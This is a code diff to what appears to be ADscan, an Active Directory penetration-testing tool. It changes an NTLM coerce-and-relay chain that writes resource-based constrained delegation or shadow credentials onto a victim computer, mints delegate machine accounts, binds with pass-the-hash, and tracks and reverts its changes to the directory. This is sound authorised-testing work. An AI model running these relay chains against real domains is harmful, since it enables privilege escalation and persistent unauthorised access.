@@ -32,10 +32,14 @@ Cleanup lifecycle (durable AD objects, NOT auto-revert):
   that makes them, so a FAILED run always leaves no mess. The delegate machine
   account, the RBCD grant and the KeyCredentialLink are durable AD objects, so
   they are tagged ``operator_confirmed`` in the ledger. The per-run cleanup
-  reverts them ONLY on failure/abort. On SUCCESS the changes are KEPT (the
-  operator retains the access and can reuse the minted account in the same
-  session); at workspace exit the operator is prompted whether to revert them
-  (see :func:`run_operator_confirmed_exit_cleanup`). Cleanup restores the
+  reverts them ONLY on failure/abort. On SUCCESS the changes stay standing for
+  the rest of the session (the operator can reuse the minted account), and the
+  workspace-exit hook decides once whether to revert them (see
+  :func:`run_operator_confirmed_exit_cleanup`; the decision itself lives in
+  ``services.durable_change_policy``: non-interactive runs revert unless the
+  operator explicitly chose to keep, interactive runs ask with "Revert all"
+  preset). Every revert is confirmed by re-reading the object; one that cannot
+  be confirmed is recorded ``manual_required`` with its DN. Cleanup restores the
   victim's prior attribute exactly (RBCD: prior security descriptor, or clears
   when originally empty; shadow-creds: the prior KeyCredentialLink list,
   removing only the entry we appended) and deletes any created delegate machine
@@ -51,14 +55,15 @@ a safe default and proceed only when feasibility is viable.
 
 from __future__ import annotations
 
+from adscan_internal.services.ledger_guard import active_ledger, ledger_or_warn
+
 import os
 import shlex
-import socket
 from dataclasses import dataclass, field
 from typing import Any, Mapping, Optional
 
 from adscan_internal import telemetry
-from adscan_internal.interaction import is_ci_marker_present, is_non_interactive
+from adscan_internal.interaction import is_non_interactive
 from adscan_internal.models.domain import (
     resolve_dc_ip,
     resolve_domain_controllers,
@@ -74,6 +79,7 @@ from adscan_internal.rich_output import (
 from adscan_internal.services.environment_change_ledger import (
     CHANGE_CLASS_OPERATOR_CONFIRMED,
 )
+from adscan_internal.services.listener_ip import present_pending_callback_advice
 from adscan_core.rich_output import print_exception
 
 # Supported write methods (selector + feasibility key).
@@ -89,6 +95,9 @@ _VALID_METHODS = (_METHOD_RBCD, _METHOD_SHADOW)
 RELAY_OUTCOME_SUCCESS = "success"
 RELAY_OUTCOME_NOT_VIABLE = "not_viable"
 RELAY_OUTCOME_FAILED = "failed"
+#: Declined before writing: the policy allows no manual cleanup and the cleanup
+#: account is not verified for this domain (nothing was changed).
+RELAY_OUTCOME_NOT_PERMITTED = "not_permitted"
 
 
 @dataclass(frozen=True)
@@ -225,39 +234,60 @@ def _infer_context_domain(shell: Any) -> Optional[str]:
     return current or None
 
 
-def _resolve_listener_ip(shell: Any, dc_ip: str, override: Optional[str]) -> Optional[str]:
+def _victim_ip_for_listener(
+    shell: Any, *, victim: Optional[str], domain: str, dc_ip: str
+) -> str:
+    """Return the IP of the coerced victim, the host that must call back.
+
+    The advertised listener has to be reachable from the VICTIM's segment, not
+    the DC's. An IP victim is used as-is; a hostname is resolved best-effort
+    (no operator prompt, no foreign-DC discovery) and only falls back to the
+    domain's DC when it cannot be resolved.
+    """
+    target = str(victim or "").strip()
+    if target and _looks_like_ip(target):
+        return target
+    if target:
+        try:
+            from adscan_internal.services.host_address_resolver import (  # noqa: PLC0415
+                resolve_host_address,
+            )
+
+            resolved = resolve_host_address(
+                shell,
+                host=target,
+                domain=domain,
+                resolver_ip=dc_ip,
+                allow_operator_prompt=False,
+                allow_foreign_dc_discovery=False,
+            )
+            if resolved.resolved_ip:
+                return str(resolved.resolved_ip)
+        except Exception as exc:  # noqa: BLE001 - best-effort, fall back to the DC
+            print_info_debug(f"[relay-rbcd] victim address resolution failed: {exc}")
+    return dc_ip
+
+
+def _resolve_listener_ip(
+    shell: Any, target_ip: str, override: Optional[str]
+) -> Optional[str]:
     """Resolve the relay listener IP advertised to the victim.
 
-    Explicit ``override`` wins; otherwise the shell ``myip``; otherwise the
-    kernel-chosen source IP toward the DC (no packets sent — a UDP-connect only
-    resolves the route). Returns ``None`` when nothing usable can be found.
+    Delegates to the per-target SSOT ladder (override, declared ``myip``, kernel
+    route toward ``target_ip``, interface ``myip``). Returns ``None`` when
+    nothing usable can be found.
     """
-    candidate = str(override or "").strip()
-    if candidate:
-        return candidate
-    # Per-target egress resolution: on a multi-NIC host the routing table already
-    # knows which NIC's source IP reaches the victim's segment (and a Ligolo pivot
-    # yields the target-segment redirector candidate) — more correct than a single
-    # global myip. Falls through to myip / the socket heuristic when undeterminable.
-    try:
-        from adscan_internal.services.egress_resolver import (  # noqa: PLC0415
-            resolve_egress_for_target,
-        )
+    from adscan_internal.services.listener_ip import (  # noqa: PLC0415
+        resolve_listener_ip,
+    )
 
-        vantage = resolve_egress_for_target(shell, dc_ip)
-        if vantage.callback_ip:
-            return vantage.callback_ip
-    except Exception:  # noqa: BLE001 — best-effort; fall back below
-        pass
-    myip = str(getattr(shell, "myip", "") or "").strip()
-    if myip:
-        return myip
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            sock.connect((dc_ip, 9))
-            return str(sock.getsockname()[0])
-    except Exception:  # noqa: BLE001 - heuristic only
-        return None
+    selection = resolve_listener_ip(shell, target=target_ip, override=override)
+    print_info_debug(
+        f"relay-rbcd listener ip: source={selection.source} "
+        f"ip={mark_sensitive(str(selection.ip or 'none'), 'ip')} "
+        f"target={mark_sensitive(selection.target, 'ip')} reason={selection.reason}"
+    )
+    return selection.ip
 
 
 def _ntlm_auth_verdict_from_workspace(
@@ -515,7 +545,13 @@ def run_relay_ldap(
         )
         return
 
-    listener_ip = _resolve_listener_ip(shell, dc_ip, parsed.listener_ip)
+    listener_ip = _resolve_listener_ip(
+        shell,
+        _victim_ip_for_listener(
+            shell, victim=parsed.victim, domain=domain, dc_ip=dc_ip
+        ),
+        parsed.listener_ip,
+    )
     if not listener_ip:
         print_error(
             "Could not resolve a relay listener IP. Set 'myip' or pass --listener-ip."
@@ -527,6 +563,24 @@ def run_relay_ldap(
     method = forced_method or _select_method(shell, parsed, adcs_pki_present=adcs_pki_present)
     if method is None:
         return
+
+    # The relayed computer writes these attributes on itself and its identity is
+    # gone when they are reverted, so only the client's cleanup account (or a
+    # verified privileged credential) can undo them. Under a policy that allows
+    # no manual cleanup the chain runs only once that account is verified here.
+    from adscan_internal.services.revert_permission import (  # noqa: PLC0415
+        cleanup_write_permitted,
+    )
+
+    relay_kinds = (
+        ("keycredentiallink_added",)
+        if method == _METHOD_SHADOW
+        else ("machine_account_created", "rbcd_delegation_added")
+    )
+    if not cleanup_write_permitted(
+        shell, domain=domain, kinds=relay_kinds, surface="relay_ldap", target=parsed.victim or ""
+    ):
+        return RELAY_OUTCOME_NOT_PERMITTED
 
     # --- 2. Feasibility gate ------------------------------------------------ #
     feasibility = _evaluate_feasibility(
@@ -543,7 +597,7 @@ def run_relay_ldap(
     if not _confirm_proceed_after_feasibility(shell, feasibility, method=method):
         return RELAY_OUTCOME_NOT_VIABLE
 
-    ledger = getattr(shell, "environment_change_ledger", None)
+    ledger = ledger_or_warn(shell)
     state = _RbcdLedgerState()
 
     # Success flag — gates per-run cleanup. The chain sets it True only when the
@@ -696,7 +750,13 @@ def _evaluate_feasibility(
 def _assess_maq(
     shell: Any, *, domain: str, dc_ip: str, username: str, secret: str
 ) -> Optional[int]:
-    """MAQ preflight for the create-new-delegate branch. Returns the quota or None."""
+    """MAQ preflight for the create-new-delegate branch.
+
+    Returns the ACTOR's remaining capacity (domain quota minus the computer
+    objects whose ``mS-DS-CreatorSID`` is the actor), falling back to the domain
+    quota when the actor's count could not be read. The domain value alone said
+    "ok" for an actor that had already used every slot (MAQ investigation 3.2).
+    """
     try:
         from adscan_internal.services.domain_posture import get_posture  # noqa: PLC0415
         from adscan_internal.services.ldap_transport_service import (  # noqa: PLC0415
@@ -706,19 +766,20 @@ def _assess_maq(
             assess_machine_account_capacity,
         )
 
-        is_nt = _looks_like_nt_hash(secret)
         ldap_config = ADscanLDAPConfig(
             domain=domain,
             dc_ip=dc_ip,
             use_ldaps=True,
             use_kerberos=False,
             username=username,
-            password=None if is_nt else secret,
+            password=secret,
             posture_snapshot=get_posture(getattr(shell, "domains_data", {}) or {}, domain=domain),
         )
         capacity = assess_machine_account_capacity(
             ldap_config=ldap_config, actor_username=username, shell=shell
         )
+        if capacity.remaining is not None:
+            return capacity.remaining
         return capacity.domain_quota
     except Exception as exc:  # noqa: BLE001 - preflight is best-effort
         telemetry.capture_exception(exc)
@@ -803,6 +864,7 @@ def _run_chain(
     # 4. Coerce + relay -> write RBCD on the victim (SELF target).
     relay_outcome = run_async_sync(
         _coerce_relay_rbcd(
+            shell=shell,
             victim=parsed.victim or "",
             dc_ip=dc_ip,
             domain=domain,
@@ -813,6 +875,9 @@ def _run_chain(
             socks5=parsed.socks5,
         )
     )
+    # Safe point: the coerce-and-relay loop has finished, so "no callback arrived"
+    # guidance (which may prompt) is shown here, not from inside the coroutine.
+    present_pending_callback_advice(shell)
     # Teardown trace: if this marker prints, the coerce-and-relay (including the
     # listener shutdown) returned and any freeze is downstream (ledger / S4U); if
     # it does NOT print but the run_native_relay teardown markers do, the hang is
@@ -915,6 +980,7 @@ def _run_chain_shadow(
     # 4. Coerce + relay -> append msDS-KeyCredentialLink on the victim (SELF).
     relay_outcome = run_async_sync(
         _coerce_relay_shadow_creds(
+            shell=shell,
             victim=parsed.victim or "",
             dc_ip=dc_ip,
             domain=domain,
@@ -924,6 +990,8 @@ def _run_chain_shadow(
             socks5=parsed.socks5,
         )
     )
+    # Safe point: see the RBCD chain; the loop has finished.
+    present_pending_callback_advice(shell)
     sc_result = _first_relay_result(relay_outcome)
     if sc_result is None or not sc_result.success:
         err = sc_result.error if sc_result else "no authentication captured"
@@ -1000,11 +1068,7 @@ def _provision_delegate(
         )
         return _PlannedDelegate(sid=parsed.actor_sid, created=False)
 
-    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
     from adscan_internal.services.domain_posture import get_posture  # noqa: PLC0415
-    from adscan_internal.services.exploitation.delegation_native import (  # noqa: PLC0415
-        add_computer_native,
-    )
     from adscan_internal.services.exploitation.minted_account_identity import (  # noqa: PLC0415
         default_minted_identity,
         prompt_minted_account_identity,
@@ -1022,14 +1086,21 @@ def _provision_delegate(
     if reuse is not None:
         return reuse
 
-    default_name, default_password = default_minted_identity(
+    from adscan_internal.services.machine_account_provisioning_service import (  # noqa: PLC0415
+        acquire_controlled_machine_account,
+        generate_machine_account_name,
+    )
+
+    _unused_name, default_password = default_minted_identity(
         shell, domain=domain, username=username, password=secret
     )
+    # ADscan's computer accounts carry one recognisable name shape (ADSCAN + 8
+    # hex, inside the 15-character NetBIOS limit); the operator may override it.
+    default_name = generate_machine_account_name().rstrip("$")
     name, machine_password = prompt_minted_account_identity(
         shell, default_username=default_name, default_password=default_password
     )
 
-    is_nt = _looks_like_nt_hash(secret)
     posture = get_posture(getattr(shell, "domains_data", {}) or {}, domain=domain)
     ldap_config = ADscanLDAPConfig(
         domain=domain,
@@ -1037,7 +1108,7 @@ def _provision_delegate(
         use_ldaps=True,
         use_kerberos=False,
         username=username,
-        password=None if is_nt else secret,
+        password=secret,
         posture_snapshot=posture,
     )
 
@@ -1045,89 +1116,55 @@ def _provision_delegate(
         f"Creating delegate machine account {mark_sensitive(name + '$', 'user')} "
         f"in {mark_sensitive(domain, 'domain')}…"
     )
-    result = run_async_sync(
-        add_computer_native(
-            ldap_config=ldap_config,
-            computer_name=name,
-            password=machine_password,
-        )
+    lease = acquire_controlled_machine_account(
+        shell,
+        domain=domain,
+        actor_ldap_config=ldap_config,
+        actor_username=username,
+        purpose="rbcd_relay_delegate",
+        method="relay_rbcd_delegate_mint",
+        computer_name=name,
+        password=machine_password,
     )
-    if not result.success:
-        if result.quota_exceeded:
-            print_error(
-                "MachineAccountQuota exhausted — cannot mint a delegate. "
-                "Re-run with --actor-sid <SID> using an already-controlled machine account."
-            )
-        else:
-            print_error(f"Delegate machine account creation failed: {result.error}")
+    if lease is None:
+        print_error(
+            "Could not obtain a delegate machine account (quota exhausted or creation "
+            "refused). Re-run with --actor-sid <SID> using an already-controlled "
+            "machine account."
+        )
         return None
 
-    sam = result.computer_name or (name + "$")
     delegate = _PlannedDelegate(
-        sid="",  # filled below
-        sam=sam,
-        password=machine_password,
-        dn=result.dn,
-        created=True,
-    )
-
-    # Resolve the new account's SID (needed for the RBCD ACE) via a credentialed
-    # connection — also used later for cleanup.
-    delegate.sid = (
-        _resolve_delegate_sid(
-            domain=domain, dc_ip=dc_ip, username=username, secret=secret, sam=sam
-        )
-        or ""
+        sid=lease.sid or "",
+        sam=lease.sam_account_name,
+        password=lease.password,
+        dn=lease.dn,
+        # A retained account (retain_one) is reused, never deleted by this run.
+        created=lease.created,
+        ledger_change_id=lease.ledger_change_id,
     )
     if not delegate.sid:
         print_warning(
             "Created the delegate but could not resolve its SID — the RBCD write "
             "needs it. Aborting (the account will be cleaned up)."
         )
-
-    # Register the created account in the ledger IMMEDIATELY (so cleanup deletes
-    # it even if a later step fails or crashes). Durable AD object ->
-    # operator_confirmed: kept on success, reverted on failure / operator prompt.
-    if ledger is not None:
-        try:
-            delegate.ledger_change_id = ledger.register_change(
-                kind="machine_account_created",
-                domain=domain,
-                target=sam,
-                detail={
-                    "dn": result.dn,
-                    "sam": sam,
-                    "sid": delegate.sid or None,
-                    "method": result.method,
-                    "purpose": "rbcd_relay_delegate",
-                },
-                method="relay_rbcd_delegate_mint",
-                change_class=CHANGE_CLASS_OPERATOR_CONFIRMED,
-            )
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-
-    if not delegate.sid:
         return None
     print_success(
-        f"Delegate created: {mark_sensitive(sam, 'user')} "
+        f"Delegate {'created' if lease.created else 'reused'}: "
+        f"{mark_sensitive(delegate.sam, 'user')} "
         f"(SID {mark_sensitive(delegate.sid, 'text')})"
     )
 
-    # Persist the minted machine account as a reusable owned credential so future
-    # relay/RBCD runs can REUSE it (and it surfaces in the create-vs-reuse
-    # selector) instead of minting a fresh account every time. Skip verification
-    # and every privilege/followup prompt — we just created it, it is a machine
-    # account, and we don't want to drive privilege-enumeration follow-ups here.
+    # Persist the delegate as an owned credential so the create-vs-reuse
+    # selector offers it. Skip verification and every privilege prompt.
     try:
         from adscan_internal.cli.creds import add_credential  # noqa: PLC0415
 
         add_credential(
             shell,
             domain=domain,
-            user=sam,
-            cred=machine_password,
+            user=delegate.sam,
+            cred=lease.password,
             verify_credential=False,
             prompt_for_user_privs_after=False,
             skip_user_privs_enumeration=True,
@@ -1135,10 +1172,6 @@ def _provision_delegate(
             ui_silent=True,
             mark_user_compromised=True,
             credential_origin="relay_rbcd_minted_machine_account",
-        )
-        print_info_debug(
-            f"[relay-rbcd] persisted minted delegate {mark_sensitive(sam, 'user')} "
-            "as a reusable owned credential"
         )
     except Exception as exc:  # noqa: BLE001 - persistence is best-effort
         telemetry.capture_exception(exc)
@@ -1148,8 +1181,6 @@ def _provision_delegate(
         )
 
     return delegate
-
-
 def _select_reusable_delegate(
     shell: Any, *, domain: str, dc_ip: str, username: str, secret: str
 ) -> Optional[_PlannedDelegate]:
@@ -1239,14 +1270,16 @@ def _resolve_delegate_sid(
             _resolve_principal_sid,
         )
 
-        is_nt = _looks_like_nt_hash(secret)
+        # ADscanLDAPConfig has no nt_hash field: an NT hash rides in ``password``
+        # and the transport binds pass-the-hash. Dropping it (the previous
+        # ``None if is_nt``) bound as ``username`` with an empty secret.
         config = ADscanLDAPConfig(
             domain=domain,
             dc_ip=dc_ip,
             use_ldaps=True,
             use_kerberos=False,
             username=username,
-            password=None if is_nt else secret,
+            password=secret,
         )
         with ADscanLDAPConnection(config) as conn:
             return _resolve_principal_sid(conn, sam)
@@ -1259,6 +1292,7 @@ def _resolve_delegate_sid(
 
 async def _coerce_relay_rbcd(
     *,
+    shell: Any = None,
     victim: str,
     dc_ip: str,
     domain: str,
@@ -1288,6 +1322,7 @@ async def _coerce_relay_rbcd(
         )
     )
     return await _coerce_relay_with_target(
+        shell=shell,
         target=target,
         victim=victim,
         dc_ip=dc_ip,
@@ -1301,6 +1336,7 @@ async def _coerce_relay_rbcd(
 
 async def _coerce_relay_shadow_creds(
     *,
+    shell: Any = None,
     victim: str,
     dc_ip: str,
     domain: str,
@@ -1326,6 +1362,7 @@ async def _coerce_relay_shadow_creds(
         )
     )
     return await _coerce_relay_with_target(
+        shell=shell,
         target=target,
         victim=victim,
         dc_ip=dc_ip,
@@ -1339,6 +1376,7 @@ async def _coerce_relay_shadow_creds(
 
 async def _coerce_relay_with_target(
     *,
+    shell: Any = None,
     target: Any,
     victim: str,
     dc_ip: str,
@@ -1385,6 +1423,7 @@ async def _coerce_relay_with_target(
         coercion_target_host=victim,
         coercion_target_name=victim,
         config=NativeCoerceRelayConfig(
+            shell=shell,
             listener_host=listener_ip,
             relay=NativeRelayRunConfig(
                 source="smb",
@@ -1846,7 +1885,7 @@ def _print_shadow_result_panel(
     grid.add_row("", "")
     grid.add_row(
         "Cleanup",
-        "[dim]kept this session — you'll be prompted to revert at exit[/]",
+        "[dim]left in place this session — resolved at workspace exit[/]",
     )
 
     title = Text("  Shadow-Credentials Relay — Chain Result  ", style="bold white on green")
@@ -1867,9 +1906,12 @@ def _cleanup(
     """Per-run cleanup of the durable changes — reverts ONLY on failure/abort.
 
     On SUCCESS (``succeeded=True``) the durable ``operator_confirmed`` changes
-    are KEPT so the operator retains the access and can reuse the minted account
-    in the same session; the workspace-exit hook prompts whether to revert them
-    later. On FAILURE/abort (``succeeded=False``) the partial changes are
+    stay standing (``pending``) so the operator can reuse the minted account in
+    the same session; the workspace-exit hook resolves them once (revert by
+    default when unattended, ask interactively). They are deliberately NOT marked
+    ``kept`` here: ``kept`` is terminal, so the exit hook would never see them and
+    a successful run would leave them in the directory whatever the policy says.
+    On FAILURE/abort (``succeeded=False``) the partial changes are
     reverted as before, so a failed run leaves no mess.
 
     Uses our own shell credentials via a credentialed LDAP connection. Each
@@ -1888,59 +1930,206 @@ def _cleanup(
         return  # nothing was changed
 
     if succeeded:
-        # Keep the durable assets — do not revert per-run. Mark them KEPT so the
-        # ledger + cleanup report reflect the operator's retained access.
-        _mark_kept_on_success(ledger, state)
+        # Leave the durable assets standing for the rest of the session; the
+        # workspace-exit hook resolves them (durable_change_policy).
         print_info(
-            "Durable changes kept for reuse this session — you'll be prompted to "
-            "revert them at workspace exit."
+            "Durable changes left in place for reuse this session — they are "
+            "resolved at workspace exit (reverted by default when unattended)."
         )
         return
 
+    print_info("Run did not complete — reverting partial changes (no mess left behind)…")
+    # Delegation first, the delegate account last: the RBCD grant references it.
+    for unit in _state_units(state):
+        _cascade_revert_unit(
+            shell,
+            ledger=ledger,
+            domain=domain,
+            dc_ip=dc_ip,
+            unit=unit,
+            creator_username=username,
+            creator_secret=secret,
+        )
+
+
+def _state_units(state: _RbcdLedgerState) -> list[tuple[str, Optional[str], _RbcdLedgerState]]:
+    """Split a run's state into independently revertible units, in revert order."""
+    units: list[tuple[str, Optional[str], _RbcdLedgerState]] = []
+    if state.rbcd_target_dn:
+        units.append(
+            (
+                "rbcd_delegation_added",
+                state.rbcd_change_id,
+                _RbcdLedgerState(
+                    rbcd_change_id=state.rbcd_change_id,
+                    rbcd_target_dn=state.rbcd_target_dn,
+                    rbcd_prior_sd_hex=state.rbcd_prior_sd_hex,
+                    rbcd_prior_empty=state.rbcd_prior_empty,
+                ),
+            )
+        )
+    if state.shadow_target_dn:
+        units.append(
+            (
+                "keycredentiallink_added",
+                state.shadow_change_id,
+                _RbcdLedgerState(
+                    shadow_change_id=state.shadow_change_id,
+                    shadow_target_dn=state.shadow_target_dn,
+                    shadow_prior_values=state.shadow_prior_values,
+                ),
+            )
+        )
+    if state.delegate is not None and state.delegate.created:
+        units.append(
+            (
+                "machine_account_created",
+                state.delegate.ledger_change_id,
+                _RbcdLedgerState(delegate=state.delegate),
+            )
+        )
+    return units
+
+
+def _revert_unit(conn: Any, *, kind: str, ledger: Any, state: _RbcdLedgerState) -> None:
+    """Dispatch one unit's revert by its ledger kind."""
+    if kind == "rbcd_delegation_added":
+        _revert_rbcd(conn, ledger=ledger, state=state)
+    elif kind == "keycredentiallink_added":
+        _revert_shadow_creds(conn, ledger=ledger, state=state)
+    elif kind == "machine_account_created":
+        _delete_delegate(conn, ledger=ledger, state=state)
+
+
+def _unit_manual_command(kind: str, state: _RbcdLedgerState) -> tuple[str, str]:
+    """(remediation command, object DN) for a unit no credential could revert."""
+    if kind == "rbcd_delegation_added":
+        return (
+            "Clear or restore msDS-AllowedToActOnBehalfOfOtherIdentity on the "
+            "target with a privileged account.",
+            str(state.rbcd_target_dn or ""),
+        )
+    if kind == "keycredentiallink_added":
+        return (
+            "Restore msDS-KeyCredentialLink on the target to its prior value list.",
+            str(state.shadow_target_dn or ""),
+        )
+    delegate = state.delegate
+    target = (delegate.sam or delegate.dn) if delegate else ""
+    return (
+        f"Delete the machine account {target} with a privileged account.",
+        str((delegate.dn if delegate else "") or ""),
+    )
+
+
+def _cascade_revert_unit(
+    shell: Any,
+    *,
+    ledger: Any,
+    domain: str,
+    dc_ip: Optional[str],
+    unit: tuple[str, Optional[str], _RbcdLedgerState],
+    creator_username: str = "",
+    creator_secret: str = "",
+    exclude: tuple[str, ...] = (),
+) -> bool:
+    """Revert one relay-chain change through the shared revert precedence.
+
+    Candidates: the client cleanup account, a verified privileged credential,
+    the account that made the change, then the domain's context credential
+    (the historical relay default). A non-final candidate that cannot delete
+    the delegate does NOT disable it: a later, stronger candidate may still
+    delete it, and a disabled object keeps consuming the actor's quota.
+    """
     from adscan_internal.services.ldap_transport_service import (  # noqa: PLC0415
-        ADscanLDAPConfig,
         ADscanLDAPConnection,
     )
-
-    is_nt = _looks_like_nt_hash(secret)
-    config = ADscanLDAPConfig(
-        domain=domain,
-        dc_ip=dc_ip,
-        use_ldaps=True,
-        use_kerberos=False,
-        username=username,
-        password=None if is_nt else secret,
+    from adscan_internal.services.revert_credentials import (  # noqa: PLC0415
+        revert_candidates,
+        run_revert_cascade,
     )
 
-    print_info("Run did not complete — reverting partial changes (no mess left behind)…")
-    try:
-        with ADscanLDAPConnection(config) as conn:
-            _revert_rbcd(conn, ledger=ledger, state=state)
-            _revert_shadow_creds(conn, ledger=ledger, state=state)
-            _delete_delegate(conn, ledger=ledger, state=state)
-    except Exception as exc:  # noqa: BLE001
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
-        print_error(f"Cleanup connection failed: {exc}")
-        _mark_cleanup_failed_manual(ledger, state, error=str(exc))
+    kind, change_id, state = unit
+    session_user, session_secret = _shell_domain_creds(shell, domain)
+    candidates = revert_candidates(
+        shell,
+        domain=domain,
+        purpose=kind,
+        creator_username=creator_username,
+        creator_secret=creator_secret,
+        session_username=session_user,
+        session_secret=session_secret,
+        exclude=exclude,
+    )
 
-
-def _mark_kept_on_success(ledger: Any, state: _RbcdLedgerState) -> None:
-    """Mark every durable change as KEPT (success path; not reverted per-run)."""
-    if ledger is None:
-        return
-    for change_id in (
-        state.rbcd_change_id,
-        state.shadow_change_id,
-        state.delegate.ledger_change_id if state.delegate else None,
-    ):
-        if not change_id:
-            continue
+    def _mark_exhausted(error: Optional[str]) -> None:
+        if ledger is None or not change_id:
+            return
+        command, object_dn = _unit_manual_command(kind, state)
         try:
-            ledger.mark_kept(change_id)
+            ledger.mark_manual_required(
+                change_id,
+                reason=_cleanup_manual_reason(error or "missing credential"),
+                remediation_command=command,
+                remediation_object_dn=object_dn,
+                error=error or "No DC or credential available to revert this change.",
+            )
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
             print_exception(exception=exc)
+
+    if not dc_ip or not candidates:
+        print_warning(
+            f"Cannot revert {_exit_kind_label({'kind': kind})} in "
+            f"{mark_sensitive(domain or '?', 'domain')}: missing DC or credentials. "
+            "It is recorded with manual-cleanup instructions."
+        )
+        _mark_exhausted(None)
+        return False
+
+    def _attempt(candidate: Any, attempt_ledger: Any, final: bool) -> None:
+        state.extra["allow_disable_fallback"] = final
+        with ADscanLDAPConnection(candidate.ldap_config(dc_ip=dc_ip)) as conn:
+            _revert_unit(conn, kind=kind, ledger=attempt_ledger, state=state)
+
+    result = run_revert_cascade(
+        ledger=ledger,
+        change_id=change_id,
+        candidates=candidates,
+        attempt=_attempt,
+        on_exhausted=_mark_exhausted,
+    )
+    if result.confirmed and kind == "machine_account_created" and state.delegate is not None:
+        _after_machine_account_revert(shell, ledger=ledger, domain=domain, state=state, change_id=change_id)
+    return result.confirmed
+
+
+def _after_machine_account_revert(
+    shell: Any, *, ledger: Any, domain: str, state: _RbcdLedgerState, change_id: Optional[str]
+) -> None:
+    """Bookkeeping once a created machine account was deleted (or disabled).
+
+    A DELETED account leaves the credential store and the managed registry, so
+    no later step reuses an object that no longer exists. A merely DISABLED one
+    stays flagged ``neutralized_only`` so the final retry pass can delete it
+    with a stronger credential obtained later.
+    """
+    entry = None
+    get_change = getattr(ledger, "get_change", None)
+    if callable(get_change) and change_id:
+        entry = get_change(change_id)
+    neutralized = bool(((entry or {}).get("detail") or {}).get("neutralized_only"))
+    if neutralized and not state.extra.get("deleted_now"):
+        return
+    try:
+        from adscan_internal.services.machine_account_provisioning_service import (  # noqa: PLC0415
+            forget_machine_account,
+        )
+
+        forget_machine_account(shell, domain=domain, sam_account_name=str(state.delegate.sam or ""))
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
 
 
 def _cleanup_manual_reason(error: Any) -> str:
@@ -1955,6 +2144,18 @@ def _cleanup_manual_reason(error: Any) -> str:
     return _tax.MANUAL_REASON_REVERT_FAILED
 
 
+def _rbcd_attribute_equals(conn: Any, *, target_dn: str, expected: bytes) -> bool:
+    """Re-read msDS-AllowedToActOnBehalfOfOtherIdentity and compare it byte for byte."""
+    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
+        _read_attr_values,
+    )
+
+    if not target_dn:
+        return False
+    values = _read_attr_values(conn, target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
+    return len(values) == 1 and isinstance(values[0], bytes) and values[0] == expected
+
+
 def _confirm_rbcd_or_manual(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None:
     """Verify the RBCD revert by re-reading the victim, then mark the ledger."""
     from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
@@ -1964,13 +2165,21 @@ def _confirm_rbcd_or_manual(conn: Any, *, ledger: Any, state: _RbcdLedgerState) 
 
     confirmed = False
     try:
-        if state.rbcd_prior_empty or not state.rbcd_prior_sd_hex:
+        if (
+            state.rbcd_prior_empty
+            or not state.rbcd_prior_sd_hex
+            or state.rbcd_prior_sd_hex == "empty"
+        ):
             # We cleared the attribute entirely — confirm it is gone.
             confirmed = verify_rbcd_removed(conn, target_dn=state.rbcd_target_dn or "")
         else:
-            # We restored prior bytes; a confirming re-read is best-effort. Treat a
-            # successful modify + readable attribute as confirmed.
-            confirmed = True
+            # We restored the prior security descriptor: confirm by re-reading
+            # that the attribute holds exactly those bytes again.
+            confirmed = _rbcd_attribute_equals(
+                conn,
+                target_dn=state.rbcd_target_dn or "",
+                expected=bytes.fromhex(state.rbcd_prior_sd_hex),
+            )
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
         print_exception(exception=exc)
@@ -1996,6 +2205,7 @@ def _confirm_shadow_or_manual(conn: Any, *, ledger: Any, state: _RbcdLedgerState
     """Verify the KeyCredentialLink revert by re-reading, then mark the ledger."""
     from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
         VERIFY_KEYCREDENTIAL,
+        _norm,
         _read_attr_values,
     )
 
@@ -2004,11 +2214,13 @@ def _confirm_shadow_or_manual(conn: Any, *, ledger: Any, state: _RbcdLedgerState
         prior = state.shadow_prior_values or []
         values = _read_attr_values(conn, state.shadow_target_dn or "", "msDS-KeyCredentialLink")
         # When we cleared the attribute, confirm it is empty; when we restored a
-        # prior list, confirm the count matches what we restored.
+        # prior list, confirm the attribute holds exactly that list again (a
+        # matching count alone would accept our key still present in place of
+        # one of the client's).
         if not prior:
             confirmed = len(values) == 0
         else:
-            confirmed = len(values) == len(prior)
+            confirmed = {_norm(v) for v in values} == {_norm(v) for v in prior}
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
         print_exception(exception=exc)
@@ -2048,8 +2260,16 @@ def _verify_machine_neutralized(conn: Any, *, sam: str | None) -> bool:
 def _confirm_delete_or_manual(
     conn: Any, *, ledger: Any, delegate: Any, dn: str
 ) -> None:
-    """Verify the machine-account delete by re-reading, then mark the ledger."""
-    if _verify_machine_neutralized(conn, sam=delegate.sam):
+    """Verify the machine-account delete by re-reading, then mark the ledger.
+
+    After a delete the object must be GONE: a disabled account still exists and
+    still holds a quota slot, so it is not accepted as the revert here.
+    """
+    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
+        verify_machine_account_deleted,
+    )
+
+    if delegate.sam and verify_machine_account_deleted(conn, sam_account_name=delegate.sam):
         ledger.mark_reverted_confirmed(
             delegate.ledger_change_id, verification_method="machine_account_reread"
         )
@@ -2185,7 +2405,16 @@ def _delete_delegate(conn: Any, *, ledger: Any, state: _RbcdLedgerState) -> None
             raise RuntimeError("could not resolve delegate DN for deletion")
         ok = conn.delete(dn)
         if ok:
+            state.extra["deleted_now"] = True
             if ledger is not None and delegate.ledger_change_id:
+                # An object this run had only disabled is now gone: drop the flag
+                # and the manual instruction that went with it.
+                update_detail = getattr(ledger, "update_detail", None)
+                if callable(update_detail):
+                    update_detail(delegate.ledger_change_id, neutralized_only=None)
+                    ledger.set_revert_metadata(
+                        delegate.ledger_change_id, remediation_command=""
+                    )
                 _confirm_delete_or_manual(
                     conn, ledger=ledger, delegate=delegate, dn=dn
                 )
